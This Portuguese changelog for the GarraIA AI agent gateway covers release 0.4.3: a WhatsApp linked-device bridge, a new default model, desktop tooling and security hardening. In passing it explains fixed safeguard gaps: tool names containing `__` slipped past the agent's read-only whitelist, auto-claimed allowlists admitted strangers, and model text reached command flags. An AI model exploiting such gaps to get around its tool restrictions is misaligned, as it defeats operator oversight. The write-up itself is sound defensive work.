# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

## [0.4.3] - 2026-09-21

Release em que o Garra entrou no WhatsApp pessoal. Ate aqui o canal WhatsApp
era so a Meta Cloud API — conta Business, numero cadastrado na Meta e URL
publica, barreira que o usuario domestico nao passa. Agora `garra whatsapp`
mostra um menu de duas opcoes, desenha um QR code no terminal e o numero que ja
esta no bolso do operador passa a falar com o agente (ADR 0023). A divisao de
trabalho e o ponto: uma ponte Node/Baileys stateless cuida so do protocolo do
WhatsApp e fala NDJSON por stdio, enquanto o Rust desenha o QR, cifra a sessao
em repouso (AES-256-GCM em `<data_dir>/whatsapp/default/`, 0600 em diretorio
0700), aplica allowlist propria e fail-closed, e supervisiona o processo filho
no regime do MCP — `env_clear` com allowlist de ambiente, PDEATHSIG, filho
morrendo no `Drop`, keepalive por ping/pong e redacao da cauda do stderr —
menos o RLIMIT_AS, que o V8 do Node nao tolera. Node.js 20+ vira requisito so
desse caminho; a Cloud API continua sem ele. O pareamento com aparelho real e
validacao manual, e o CI cobre protocolo, maquina de estados, store cifrado e
ciclo de vida contra uma ponte falsa.

E a maior faixa de seguranca de uma release ate hoje, e quase toda ela fecha
controles que existiam e nao valiam. Cinco fail-opens do MCP: o restart pela
admin API apagava a allowlist de tools, o DELETE nao derrubava a conexao viva,
a whitelist do modo isentava qualquer nome com `__`, a entrada HTTP do
`mcp.json` era descartada pelo loader e uma escrita de admin apagava o que os
outros servidores declaravam. O filho MCP deixa de herdar o ambiente inteiro
do gateway e `vault:` passa a ser resolvido no boot, fail-closed. O gate de
`gateway.api_key` passa a cobrir o plano de conversa, o A2A e o socket do
papagaio; o wizard gera credencial quando o bind e exposto; as file tools
ganham jail de diretorio; o guard de injecao indireta se estende a MCP,
`file_read` e dispositivos; `repo_search` e `git_diff` deixam de entregar
texto do modelo em posicao de flag; e `POST /api/providers` conecta com
cliente pinado aos IPs vetados. O sandbox por tool, entregue inteiro na
#1222 e inalcancavel por qualquer instalacao, ganha a secao `agent.sandbox` —
nova, default `off`, cobrindo hoje so a tool `bash`, com o backend `ssh`
dizendo em letras claras que e execucao remota e nao sandbox.

No runtime, o Garra passa a ter um LLM padrao so: `z-ai/glm-5.3-flash` via
OpenRouter em todas as superficies (ADR 0022), com o local como segunda opcao.
O auto-router de modo vale em todos os pontos de entrada, rede caida cai ao
fallback local em vez de matar o turno, o 404 de roteamento do OpenRouter vira
erro de configuracao acionavel e parametro ausente numa tool vira observacao
soft. O `garra chat` grava a pergunta antes do turno e retoma o ultimo turno
interrompido com `--resume`, o `/model` virou transacional, o REPL parou de
exibir tracing cru e o ledger de runs ganhou o primeiro escritor de producao.

Fora disso: o catalogo de hardware skills passa a classificar risco em runtime,
o ADR 0021 do Desktop Control Center foi aceito e entregou a crate
`garraia-desktop-core` e o `garra desktop`, o Garra Mobile fala pt-BR e ingles
com o icone certo, o S3 ganhou multipart com checksum por parte, toda crate
declara a MSRV 1.95 e o formato dos fragmentos de changelog virou gate de CI.
Nenhuma migracao de dado e necessaria. Tres coisas mudam de significado:
`gateway.allowed_origins` vazio passa a ser "nenhuma origem cross-origin",
`GARRAIA_MCP_MODEL_ALLOWLIST=openrouter/free` precisa incluir o default novo,
e o autodetect do `garra chat` tenta a nuvem antes do Ollama.

### Added
- **Garra Mobile em portugues do Brasil e ingles, com seletor de idioma (#1178).**
  O app era uma mistura de ingles e portugues sem opcao de idioma. Agora toda a
  copy de UI (telas, botoes, dialogos, erros, estados vazios, tooltips, canais de
  notificacao, prompt biometrico) sai de `lib/l10n/app_en.arb` + `app_pt.arb`
  via `context.l10n` (Flutter gen_l10n, 255 chaves, plurais e placeholders em
  ICU), e as strings do proprio Material (menu de selecao de texto, tooltips
  padrao) seguem o idioma via `flutter_localizations`. Settings ganha o cartao
  **Idioma**: Padrao do sistema / English / Portugues (Brasil), persistido em
  SharedPreferences e aplicado na hora, sem reiniciar; sistema em pt-BR abre o
  app em pt-BR (qualquer variante `pt` cai em pt-BR, o resto em ingles). Um teste
  (`test/l10n_hardcoded_strings_test.dart`) varre `lib/` e falha em string de UI
  hard-coded nova. Fica de fora, de proposito: valores que vem do runtime
  (nomes de provider/modelo, `status` de health, descricoes de comandos/modos
  do servidor) e o fallback `unknown` dos modelos — sao dados do gateway, nao
  copy do app.
- **ADR 0021 propoe o GarraIA Desktop Control Center (#1181).** Uma aplicacao
  grafica central (`garraia desktop`) que reune agentes, providers, integracoes,
  logs e os toggles do passaro e da Chat Bar, sem remover nada do desktop atual.
  A decisao central nao e de UI: `garraia-desktop` so tem build em PR (via
  `desktop.yml`, que nao e check obrigatorio) e nenhum lint ou teste, entao a
  logica vai para uma crate nova sem Tauri (`garraia-desktop-core`), que cai nos
  checks obrigatorios. As abas reaproveitam a superficie `/api/*` do gateway,
  com as mutantes condicionadas ao conserto da exposicao cross-origin (#1182), e
  a aba de agentes e cliente do AgentDeck em vez de reimplementar os adapters.
  Status proposed: a aceitacao e do dono.
- **`garra desktop` — a CLI abre o aplicativo desktop (#1181, milestone M1).**
  Ate aqui o controle so ia num sentido: o desktop lancava a CLI como sidecar
  Tauri. Agora existe o caminho inverso. `garra desktop` localiza o aplicativo
  instalado e o lanca; `--status` diz se esta instalado e onde; `--no-launch`
  so imprime o caminho resolvido, para script. Exit codes sysexits, no mesmo
  padrao do `config check`: 0 ok, 69 nao instalado, 70 encontrado mas nao
  abriu — um script consegue separar os dois casos.
  A resolucao tenta, nesta ordem, o diretorio do instalador da plataforma, a
  PATH e o diretorio da propria CLI. O diretorio do instalador vem primeiro
  porque e o unico dos tres que um terceiro nao ocupa por acidente. Ela mora
  em `garraia-desktop-core`, e nao na CLI, por dois motivos: e a crate que
  entra nos gates obrigatorios de CI, e a casca vai precisar da mesma lista de
  caminhos no M2 — uma segunda copia dela divergiria no primeiro instalador
  novo. A CLI continua sem nenhuma dependencia de Tauri, com um teste varrendo
  o proprio fonte para garantir isso, entao `cargo build --workspace --exclude
  garraia-desktop` e toda instalacao headless seguem intactos.
  O invariante que mais importa: a resolucao **nunca** devolve o proprio
  executavel. No `.deb` do desktop os dois binarios sao irmaos no mesmo
  diretorio (`/usr/bin/garraia` e `/usr/bin/garraia-desktop`, com
  `Provides/Conflicts/Replaces: garraia`), e e exatamente ali que um
  lancamento recursivo nasceria.
  Uma coisa o comando de proposito nao responde: se o aplicativo **ja esta
  rodando**. Responder isso exigiria enumerar processos nas tres plataformas
  por nome — heuristica fragil e dependencia nova — ou um canal de instancia
  unica na casca Tauri, que e onde a resposta pode ser confiavel. Esse canal e
  do M2; ate la o `--status` diz que nao sabe, em vez de imprimir um "nao" que
  seria falso toda vez que a janela estivesse aberta.
- **Crate `garraia-desktop-core`, o nucleo sem Tauri do Desktop Control Center
  (#1181, milestone M0).** `garraia-desktop` esta excluida de todos os gates
  obrigatorios de CI — o `build.rs` do Tauri exige GTK/webkit que os runners
  nao tem — e por isso nao tem cobertura automatizada nenhuma. A crate nova e
  o outro lado dessa fronteira: leva a logica que nao precisa de janela para um
  lugar que o CI compila, linta e testa. Tres modulos: `state` (ligado/
  desligado como estado puro, sem relogio nem I/O, separando o que o usuario
  pediu do que de fato acontece), `detect` (deteccao de agentes que e leitura e
  nunca execucao — um nome na PATH nao prova identidade, entao sem corroboracao
  a deteccao fica `Ambiguous`, com um teste varrendo o proprio fonte para
  garantir que nenhum caminho de execucao apareca depois) e `supervise`
  (launch/restart/kill extraidos do `gateway.rs` da casca Tauri, agora sem
  `unwrap` em lock, sem `sleep` por dentro e com o filho morrendo junto com o
  supervisor via `Drop`). Nenhuma crate a consome ainda: a migracao da casca e
  o `garraia desktop` da CLI sao dos milestones seguintes.
- **Multipart upload nativo do S3 para arquivos acima de 16 MiB (#1214).**
  `S3Compatible::put_stream` bufferizava o corpo inteiro em memoria antes de
  subir, o que tornava um upload de 5 GiB (o teto do ledger `tus_uploads`,
  migration 014) inviavel. Agora `content_length <= 16 MiB` segue no caminho
  unico `put_object` e acima disso o upload vai por `create_multipart_upload`
  + partes de 8 MiB + `complete_multipart_upload`, derrubando o pico de
  memoria de 5 GiB para 8 MiB por upload em voo. SSE-S3 (AES256) e fixado na
  criacao e herdado por todas as partes, a allow-list de MIME roda antes da
  escolha do caminho, e o `etag_sha256` continua sendo o sha256 do conteudo
  completo — entao o HMAC de integridade sobre `{key}:{version_id}:{sha256}`
  vale igual nos dois caminhos. Qualquer falha — erro no stream, erro numa
  parte, erro no proprio `complete`, stream vazio ou stream que entrega menos
  bytes do que declarou — aborta o multipart, para que a chave nunca exponha
  conteudo parcial e nenhuma parte orfa fique sendo faturada. Acompanha um
  `docker-compose.minio.yml` de desenvolvimento (API :9000 e console :9001
  presos a 127.0.0.1, bucket `garraia-dev` criado por um one-shot `mc`).
- **`memory.auto_extract` e `memory.max_facts` — o auto-learning de fatos
  finalmente tem knob (#1221).** Com a memoria ligada, o `AgentRuntime`
  disparava `MemoryExtractor::extract_facts` em **todo** turno do usuario: uma
  chamada LLM extra, incondicional, sem nenhuma forma de desligar so ela. Quem
  usa provider pago ou com rate limit pagava a extracao em cada mensagem e a
  unica saida era desligar a memoria semantica inteira — jogar fora a busca
  para economizar a escrita. As duas chaves ja eram prometidas por docs
  antigas; agora existem de verdade.
  `memory.auto_extract` (default `true`) desliga apenas a chamada de extracao,
  preservando a memoria semantica. `memory.max_facts` (default sem teto) limita
  quantos fatos um unico turno pode gravar, mantendo os de maior confidence —
  ordenacao estavel, entao empate resolve pela ordem de chegada. Os dois
  defaults reproduzem exatamente o comportamento historico: quem nao mexer no
  `config.yml` nao percebe diferenca.
  A validacao que vivia inline no loop (confidence minima de 0.80, key e value
  nao vazios) saiu para `select_learned_facts`, uma funcao pura — era a unica
  forma de afirmar o teto e o desempate em teste sem subir um provider.
  `extraction_interval`, a terceira chave que as docs prometiam, ficou
  deliberadamente de fora: e a de menor ganho das tres e exigiria um contador
  de turnos por sessao, estado novo para economizar menos que o simples
  desligar.
- **Runs de sub-agente deixam rastro auditavel, e um restart nao os perde em
  silencio (#1224).** Os sub-agentes do `AgentCoordinator` morriam com o
  processo e nao deixavam nada para tras — mesma limitacao do `delegate_task`
  do Hermes. Quem derrubasse o gateway no meio de uma delegacao ficava sem
  saber que ela existiu, muito menos que ficou pela metade.
  Agora existe a tabela `agent_runs` e o `SessionStore` sabe abrir, fechar e
  listar run: `start_agent_run` e idempotente e nao reabre run que ja terminou,
  e `mark_interrupted_runs()` converte todo run que ficou `running` em
  `interrupted`, devolvendo a lista para o operador. O `AgentCoordinator` fala
  com isso por um `RunLedger`, cujo default e um `NoopLedger` de custo zero —
  quem nao injeta o adapter nao paga nada.
  O que **nao** mudou, e vale dizer com todas as letras: o run continua sem
  sobreviver ao processo, e nesta fatia `AgentCoordinator::spawn_agent` segue
  sem chamador de producao — a fatia original entregou CLI e gateway sem
  gravar run nenhum. O primeiro escritor real do ledger (scheduler de
  heartbeats gravando cada execucao e a subida do gateway/CLI marcando runs
  interrompidos) entra pela #1227. O que existe aqui e o
  schema + a auditoria funcionando, prontos para o chamador. Retomar um run
  interrompido, e ligar o ledger a um caminho de producao, e a #1227.
  Os snippets gravados sao truncados em 500 caracteres de proposito: o ledger e
  auditoria, nao armazenamento de conversa.

- **`ToolRegistry::execute_program` — prototipo do Code Mode em `garraia-tools`
  (#1224).** Um pipeline de N tools custava N inferencias, porque o modelo
  voltava ao loop entre cada passo. A funcao recebe um programa JSON
  (`steps: [{tool, args, as}]`) e executa os passos em sequencia, sem voltar
  ao modelo entre eles.
  A substituicao de variaveis e deliberadamente tudo-ou-nada: um arg **e** a
  variavel ou nao e, sem interpolacao dentro de string maior — nada de injecao
  de prefixo. Falha em qualquer passo encerra o programa com o indice do passo,
  e o orcamento de `max_steps` (16 por default) impede que um programa vire
  loop.
  O que ela **nao** e, com todas as letras: nao e o runtime executando nada.
  Ela vive em `garraia-tools`, crate da qual o `AgentRuntime` (em
  `garraia-agents`) nao depende; nao consulta o `ToolGate` dos modos; e nao
  tem nenhum chamador fora dos proprios testes da crate. A `tool_program`
  intrinseca do `AgentRuntime`, com gate por passo, e a #1226 (S-B) — e e la
  que o caminho se torna alcancavel. Ate entao a funcao fica marcada
  `#[deprecated]` (#1226 S-E), para que ninguem a ligue ao loop por fora do
  gate.
- **Teste de integracao do sandbox contra Docker real prova `--network none` e o mount do cwd (#1225 S4).**
  Ate aqui todo teste do sandbox por tool olhava a STRING que `wrap_command`
  monta — nenhum subia um container, entao um Docker que ignorasse a flag, ou
  um wrap que deixasse o comando rodar no host, manteria a suite verde.
  `crates/garraia-agents/tests/sandbox_docker.rs` dirige a `BashTool` com a
  policy Docker de verdade (imagem default `debian:bookworm-slim`, pull
  implicito, timeout de 120 s): o `echo` sai de dentro do container
  (`/.dockerenv` presente em todo comando, para um comando que rodasse no host
  nao passar), `getent hosts example.com` falha com `network_disabled = true` e
  resolve no controle com a rede ligada (pulado com aviso se o proprio runner
  nao tiver rede), e um arquivo criado no cwd do host e lido por `cat` por
  caminho relativo la dentro — e deixa de ser visivel com `mount_workdir =
  false`. Sem daemon o teste se pula com aviso; `GARRAIA_REQUIRE_DOCKER=1`,
  que o CI liga no runner Linux num step proprio ao lado do de `storage-s3`,
  transforma o skip em falha, no mesmo padrao do `s3_integration.rs`.
- O ledger de runs tem o primeiro escritor de producao (#1227, slice 1). A
  subida do gateway e do CLI converte runs `running` deixados por uma queda
  em `interrupted`, com ids no log (nunca o `goal`, que e PII), e cada
  execucao de tarefa agendada do scheduler deixa uma linha em `agent_runs`
  com `session_id` preenchido e desfecho terminal (`done`/`error`) — uma
  queda no meio da execucao aparece como `interrupted` no restart seguinte,
  em vez de sumir. Falha do ledger e fail-soft: nunca impede a tarefa nem
  muda o fluxo de retry do scheduler.
- **ADR 0023 decide como o WhatsApp pessoal vai funcionar (#1238).** O canal
  WhatsApp de hoje e a Meta Cloud API, que exige conta Business, numero
  cadastrado na Meta e URL publica — barreira que o usuario domestico nao
  passa. O ADR registra o caminho do WhatsApp **pessoal**, por dispositivo
  vinculado com QR code, planejado para a v0.4.3 sob `garra whatsapp`: um
  bridge Node/Baileys **stateless** falando NDJSON por stdio, com o Rust dono
  do estado (sessao num blob unico AES-256-GCM, 0600 em diretorio 0700, chave
  vinda da passphrase do cofre ou de um `session.key` proprio), supervisao no
  mesmo regime do MCP (`env_clear` + allowlist de env, PDEATHSIG, RLIMIT_AS,
  filho morre no `Drop`), maquina de estados pura no molde do
  `garraia-desktop-core`, e canal pull separado (`whatsapp_linked`) com
  allowlist e pareamento obrigatorios e tools read-only por default. Duas
  consequencias ficam escritas em vez de escondidas: Node.js vira requisito
  **so desse caminho**, o que arranha o "12 canais num binario" (agora com nota
  de rodape na comparacao), e cliente nao-oficial pode levar ao bloqueio da
  conta — por isso ha tela de consentimento antes do primeiro QR e recomendacao
  de numero secundario. Alternativas avaliadas: Go/whatsmeow como asset
  estatico (adiada, mexe na superficie de assets de release, R5 do dono),
  protocolo nativo em Rust (inviavel) e reusar o daemon do OpenClaw (destroi o
  "um comando, uma tela"). Nada disso existe ainda em build publicado; o ADR e
  a decisao, nao a entrega.
- **`garra whatsapp` conecta o WhatsApp pessoal lendo um QR code no terminal
  (#1238, ADR 0023).** Um comando, um menu de duas opcoes: numero pessoal por
  QR (`garra whatsapp link`) ou WhatsApp Business pela Cloud API oficial da
  Meta (`garra whatsapp cloud`). Tambem `garra whatsapp status` e `garra
  whatsapp logout`. Sem terminal o comando nao trava nem falha: imprime as
  duas opcoes com o comando de cada uma e sai 0, como o `garra init`.
  A sessao fica cifrada em repouso (AES-256-GCM, a mesma pilha do
  `CredentialVault`) em `<data_dir>/whatsapp/default/session.enc`, com
  arquivos 0600 dentro de um diretorio 0700 e escrita atomica. A chave e
  derivada de `GARRAIA_VAULT_PASSPHRASE` quando ela existe; sem ela fica num
  arquivo local e o `status` avisa disso em letras claras. `enabled = true` so
  e gravado na config **depois** de a sessao existir em disco, entao um
  pareamento abortado nao deixa o gateway pagando timeout a cada boot. Antes
  do primeiro QR ha uma tela de consentimento: cliente de aparelho vinculado
  nao e oficial, a conta pode ser bloqueada e a recomendacao e usar um numero
  secundario. **Nada destrutivo acontece antes dessa ultima confirmacao**: quem
  pede para re-vincular so tem a sessao atual posta de lado depois de aceitar o
  consentimento e de o Node ser encontrado, entao recusar, dar Ctrl+C ou nao
  ter Node deixa o vinculo que funcionava exatamente como estava. **E depois
  dela tambem nao**: um re-vinculo que nao chega a gravar sessao nova — QR
  expirado, Ctrl+C na tela do QR, ponte que morre antes de conectar, ou o
  proprio WhatsApp recusando o vinculo novo (401/403/419) — restaura a sessao
  anterior e avisa que restaurou. A antiga so e descartada quando a nova
  existe em disco, e se por algum motivo a restauracao nao acontecer o comando
  diz isso em vez de calar. E `garra
  whatsapp cloud` rodado so para trocar um token preserva as demais chaves que
  o operador ja tinha em `channels.whatsapp`. Vincular precisa de Node.js 20 ou
  mais novo — so este caminho precisa; a Cloud API nao.
  **O pareamento de ponta a ponta com um telefone real e validacao manual**, e
  esta descrito passo a passo em `docs/whatsapp.md`. O CI cobre protocolo,
  maquina de estados, store cifrado, desenho do QR e ciclo de vida do processo
  filho contra a ponte falsa em Python, sem Node e sem telefone.
  **A ligacao com o gateway (canal pull `whatsapp_linked` e o check em
  `/api/diagnostics`) chega no slice seguinte**: por ora o comando vincula e
  guarda a sessao, e o gateway ainda nao le esse canal.
- **`garra whatsapp restore` devolve a sessao que ficou arquivada (#1238).**
  Quando um re-vinculo e interrompido de um jeito que nao da ao GarraIA a
  chance de desfaze-lo — `kill -9`, queda de energia —, a sessao boa fica em
  `session.enc.prev` sem `session.enc`. A funcao que a traz de volta ja
  existia e nenhuma superficie a expunha: o `status` via o arquivado e mandava
  APAGAR. Agora ele oferece a recuperacao primeiro, e o comando novo renomeia
  o arquivo de volta, aperta o modo para 0600 e religa o canal na config —
  nessa ordem, a mesma do `link`. Ele nunca passa por cima de uma sessao em
  uso: nesse caso diz o que ha e sai 69, sem apagar nada.
- **Ponte WhatsApp em Node/Baileys, stateless, falando NDJSON v1 por stdio
  (#1238, ADR 0023 slice S4a).** `bridge/whatsapp/` e um diretorio, nao uma
  crate: fica fora do workspace Cargo e o Rust o spawna como processo filho.
  A divisao de trabalho e o ponto — a ponte cuida do protocolo do WhatsApp
  (Baileys pinado exato em `7.0.0-rc14`) e o Rust cuida de tudo que e do
  GarraIA: desenhar o QR, cifrar e gravar a sessao, aplicar allowlist, rotear
  para o agente. A ponte **nunca escreve no disco**; o estado de autenticacao
  vive em memoria e volta por `session_update` como snapshot completo, para o
  `CredentialVault` gravar cifrado. stdout e exclusivamente NDJSON (logger do
  Baileys em `silent` apontado para o fd 2), e todo diagnostico sai por evento
  `log` ja redigido para os 4 ultimos digitos. Acompanha a fixture
  `crates/garraia-channels/tests/fixtures/fake_whatsapp_bridge.py`, que fala o
  mesmo protocolo em milissegundos, para que os testes Rust rodem sem Node e
  sem telefone, e um `protocol-lint` que arbitra as duas contra o contrato.
  Nada no workspace Rust consome a ponte ainda: o wiring da CLI e do gateway
  vem no PR companheiro.
- **O canal pull `whatsapp_linked` no gateway (#1238, ADR 0023 slice S4d).**
  E a peca que faltava para a mensagem escaneada pelo QR chegar ao agente: ate
  aqui `garra whatsapp link` pareava e nada acontecia. O gateway supervisiona a
  ponte Node/Baileys em `mode: "serve"`, entrega cada `message` ao runtime e
  responde pelo comando `send`. Canal PULL sem registry e sem webhook — quem
  vive e um processo filho com loop de reconexao proprio —, entao o status sai
  do supervisor e nao do `ChannelRegistry`, pelo mesmo motivo que os canais
  push da #1079 precisaram de fonte propria.
  O modelo de ameaca deste canal e outro: a mensagem vem de qualquer pessoa que
  conheca o numero pessoal do operador. Tres decisoes saem disso, nenhuma
  configuravel para menos. (1) **Fail-closed de verdade**: o canal tem
  **allowlist propria**, e nao a global da instalacao — entra-se com codigo do
  `/pair` ou pela lista `allow` da config, e portao vazio significa ninguem. A
  allowlist global nao serve aqui porque *todo* canal irmao a preenche sozinho
  por auto-claim do primeiro remetente, o que faria de um estranho que mandou
  "oi" para o numero Cloud um remetente admitido no numero pessoal do operador.
  Como consequencia, `allow` deixou de ser gravado no `allowlist.json` global:
  a config e a fonte de verdade, o que sai do `allow` sai do portao (antes nao
  havia revogacao por config), e um numero liberado aqui nao vira identidade
  valida em Telegram, Discord, Slack, Signal, Matrix ou no `/start`. Pareamento
  vale para a execucao corrente; acesso duravel se declara no `allow`.
  (2) **Ferramentas somente-leitura por padrao**: sessao sem modo escolhido
  resolve para o perfil `search`, e nao para "sem politica", ate o operador
  subir o nivel com `/mode`. Enquanto a #1264 estiver aberta, esse piso **nao
  cobre ferramenta de servidor MCP** (o `ToolGate` deixa passar qualquer
  `servidor__tool` pelo whitelist), entao o canal se recusa a subir se houver
  uma registrada no boot e recusa cada turno cuja entrada encontre uma
  registrada. Nao e invariante continua: entre um turno e o seguinte o
  inventario pode mudar (o monitor de saude do MCP re-sincroniza a cada 30 s),
  e o que o controle entrega e a reducao da janela de minutos para o intervalo
  entre dois turnos. O detector pergunta o MESMO que a escapatoria do
  `ToolGate` pergunta — origem MCP **ou** `__` no nome —, e nao so a origem,
  para que uma ferramenta nativa de nome com `__` nao fure o whitelist sem
  acender nada. (3) **Guard de injecao
  indireta no texto recebido**, aplicado localmente porque a #1243 (que propoe
  generaliza-lo para alem do `web_fetch`) nao mergeou.
  Grupo so responde com opt-in explicito, e mensagem propria (`from_me`) nunca
  gera turno — sem esse filtro o canal responderia as proprias respostas para
  sempre, ja que a conta vinculada e a do operador.
  `garra whatsapp status`, `GET /api/channels` e o check `whatsapp.linked` do
  `GET /api/diagnostics` classificam pela MESMA funcao
  (`whatsapp_linked::health::classify`), com proximo passo acionavel em cada
  modo de falha — "rode `garra whatsapp link`" sem sessao, "rode `npm ci` em
  <dir>" sem dependencias na ponte. Duas fontes divergentes sobre o mesmo canal
  e o defeito que a #1079 ja custou uma vez.
  E o desligamento do gateway **cancela o supervisor**: o `cancelar()` existia,
  estava correto e nao tinha chamador de producao, entao depois do Ctrl+C o
  processo imprimia "shut down gracefully" com a ponte Node viva e turnos de
  agente rodando. A rota "o `Sender` cai junto com o `AppState`" nao existe
  aqui, por um ciclo de `Arc` (o sink do canal detem o estado que detem o
  cancelamento), e por isso o cancelamento e explicito.
  A varredura de PII do canal e a do gateway compartilham **uma** implementacao
  (`whatsapp_linked::log_audit`), e nao duas mantidas iguais por disciplina:
  cada conserto do parser — string crua, literal de char, comentario de bloco,
  macro sem delimitador — chega as duas de uma vez. A regra principal deixou de
  ser "reprove a macro que eu conheco" e passou a ser a allowlist fechada de
  call site do `expose()`, porque e no call site que a protecao de tipo acaba:
  dali em diante o valor e um `&str`, e `let s = blob.expose(); let t = s;
  info!(dado = %t)` nao e alcancado por leitura de macro nenhuma. A lista de
  macros ficou como segunda linha, cobrindo o que a primeira nao cobre (um
  campo `session`/`blob`/`creds`/`qr` que nunca passou por `expose()`).
- **O REPL do `garra chat` ganhou editor de linha: setas, historico e edicao
  (#1297).** Ate aqui o loop lia com `read_line` em modo canonico, e quem
  editava a linha era o driver do terminal — seta para cima imprimia `^[[A`,
  nao havia historico nem edicao no meio da linha. Agora o prompt e um
  `rustyline` (MIT): setas navegam o historico, Home/End/Ctrl+A/Ctrl+E/Ctrl+W
  editam, Ctrl+R busca. O historico vive em memoria durante a sessao e so vai
  ao disco quando a sessao e persistida (`--persist`/`--resume`), respeitando
  o contrato do #1088 de que sem `--persist` nada e escrito; quando gravado,
  mora em `garraia_dir()/history` (nunca `~/.garra`), criado com `0600` no
  Unix porque o que se digita num chat pode ser sensivel; linha comecando com
  espaco fica de fora, como no shell. Falha ao carregar ou gravar e fail-soft
  — vira aviso e a sessao segue sem historico.
  O editor so entra quando stdin, stdout **e** stderr sao terminal. `echo
  pergunta | garra chat`, CI e os testes de integracao continuam no
  `read_line` byte a byte, identico ao de antes; `NO_COLOR` e `TERM=dumb`
  tiram a cor, nao as setas.
  O dono do SIGINT continua sendo um so, o vigia do `run_chat` — o rustyline
  entra com a feature `signal-hook`, que e o que o impede de instalar um
  `sigaction(SIGINT)` proprio a cada `readline` (so SIGWINCH, pelo mesmo
  registro cooperativo que o tokio usa). Em raw mode o Ctrl+C no prompt ocioso
  chega como leitura interrompida em vez de sinal, e o REPL encerra com o
  mesmo 130 de sempre; durante o turno o terminal ja esta em modo canonico e o
  Ctrl+C segue cancelando o turno. Ctrl+D encerra como `/exit`. Um `kill -INT`
  externo recebido com o editor em raw mode vai ao vigia, que devolve os
  atributos do terminal antes de sair, para o shell nao ficar sem eco.

### Changed
- **`z-ai/glm-5.3-flash` via OpenRouter passa a ser o LLM padrao oficial (#1180).**
  A pergunta "qual LLM o Garra usa quando o usuario nao escolhe nada?" tinha
  cinco respostas diferentes conforme a porta de entrada: `garra chat` e o
  wizard diziam `openrouter/auto`, o `garra mcp-server` dizia `openrouter/free`,
  o gateway caia em `openai/gpt-4o` para um bloco `openrouter` sem `model:`
  explicito, e o Garra Desktop nascia em `lmstudio`. Agora ha uma constante
  unica em `garraia_config::defaults` que todas as superficies leem, travada
  por teste (ADR 0022). O local (Ollama, `qwen3.8:latest`) continua inteiro, mas como
  **segunda** opcao: entra em `agent.fallback_providers` e so vira primario
  se o usuario pedir. O wizard passa a destacar "Cloud-first" em vez de
  "Local-first" mesmo em maquina com GPU.
- **`openrouter/auto` e `openrouter/free` deixam de ser padrao em qualquer
  superficie (#1180).** Os dois continuam validos como escolha explicita
  (`--model openrouter/auto`, `model: "openrouter/free"` numa chamada MCP);
  o que muda e que nenhum caminho de codigo os seleciona sozinho. No MCP o
  `openrouter/free` era um guardrail de custo deliberado - um host pode chamar
  `garra_ask` em loop - e essa intencao foi preservada e documentada: o
  flash-tier e barato o bastante para ser o padrao nao-assistido, e
  `GARRAIA_MCP_MODEL_ALLOWLIST` continua sendo o teto duro do operador.
- **ATENCAO, quebra para quem fixou o `GARRAIA_MCP_MODEL_ALLOWLIST` (#1180).**
  Quem seguiu `docs/hermes-integration.md` e exportou
  `GARRAIA_MCP_MODEL_ALLOWLIST=openrouter/free` precisa atualizar o allowlist
  para incluir `z-ai/glm-5.3-flash` (ou remover a variavel). O allowlist e
  avaliado DEPOIS de o default novo ja ter sido aplicado, entao toda chamada
  MCP sem `model` explicito passa a falhar com `invalid_params` ate o
  allowlist ser ajustado. Exemplo:
  `export GARRAIA_MCP_MODEL_ALLOWLIST=z-ai/glm-5.3-flash,openrouter/free`.
  A mensagem do `invalid_params` passa a dizer, quando o modelo rejeitado e
  o default do servidor, que ele e o default (#1180) e como ajustar - em vez
  de deixar o operador conferir o allowlist contra um valor que nunca digitou.
- **`POST /api/providers` do Web Console tambem usa o default do projeto
  (#1180).** O "Save & Activate" numa instalacao limpa manda so a chave, sem
  `model`, e esse caminho do `router.rs` caia num `openai/gpt-4o` hardcoded
  proprio - a sexta resposta, fora do alcance da constante. Agora um `model:`
  ja escrito no bloco `openrouter` do `config.yml` (por chave ou por
  `provider: openrouter`) vence; sem ele, `z-ai/glm-5.3-flash`.
- **O gateway passa a respeitar `agent.default_provider` no boot (#1180).**
  Com mais de um provider em `llm:`, o default efetivo era o primeiro que a
  iteracao do `HashMap` devolvia - ou seja, sorteio a cada boot. Agora o
  provider nomeado em `agent.default_provider` e aplicado explicitamente; um
  nome que nao corresponda a nenhum provider registrado vira aviso no log e
  mantem o que havia, sem derrubar o boot.
- **O autodetect do `garra chat` tenta a nuvem antes do Ollama (#1180).** Sem
  `agent.default_provider` no config, a cadeia legada tentava o Ollama local
  primeiro mesmo com `OPENROUTER_API_KEY` exportada. Agora os provedores de
  nuvem com credencial vem primeiro (Anthropic > OpenAI > OpenRouter) e o
  Ollama e o que sobra quando nenhuma credencial de nuvem existe. Quem contava
  com o Ollama vencendo uma chave de nuvem exportada deve fixar
  `agent.default_provider: ollama` no `config.yml`.
- **O wizard nao preseleciona mais o download local no caminho cloud-first
  (#1180).** Escolhendo "Cloud-first", o confirm de instalar o Ollama nasce em
  "nao" e o seletor de modelo local cai na linha de pular o download - os
  ~18 GB viraram um sim explicito. No caminho "Local-first" nada mudou.
- **ADR 0021 (GarraIA Desktop Control Center) aceito pelo dono (#1181).** A opcao D
  passa de proposta a decisao: crate `garraia-desktop-core` sem Tauri (no CI, com
  testes), casca Tauri fina, abas servidas pela superficie `/api/*` do gateway (as
  mutantes ja cobertas pela guarda anti-CSRF do #1182) e aba Agents como cliente do
  AgentDeck. Os milestones do epico podem comecar, na ordem core -> CLI -> casca ->
  abas. Ficam pendentes, como o ADR previa, o gatilho S1 do ADR 0007 (framework de
  UI, no inicio do M2) e o desenho da dependencia do AgentDeck (M3).
- **Decisoes de produto do threat model fechadas pelo dono (#1182, #1191).** O
  pareamento continua global por instalacao (um codigo do `/pair` vale em qualquer
  canal habilitado; o `channel_id` do `PairingManager` e informativo), o codigo fica
  em 6 digitos (com 20 palpites por ciclo a chance de acerto e 2e-5, e o codigo e
  ditado por voz), os limites de tentativa ficam fixos (5 por usuario / 15 min / 20
  globais) e alcancar o console por nome DNS segue exigindo `gateway.allowed_origins`.
  Tudo registrado nas secoes 5.10 e 5.11 de `docs/security/threat-model.md`.
- **`gateway.allowed_origins` vazio passa a significar "nenhuma origem cross-origin" (#1182).**
  Antes significava allow-all. Quebra conhecida e deliberada de um perfil: alcancar o
  Web Console por **nome DNS** — reverse proxy com dominio proprio, mDNS (`nas.local`),
  Tailscale MagicDNS, nome de servico Docker/Compose, ingress — **sem** listar esse nome
  em `allowed_origins` passa a receber `403` nos `POST`/`PATCH`/`DELETE` vindos do
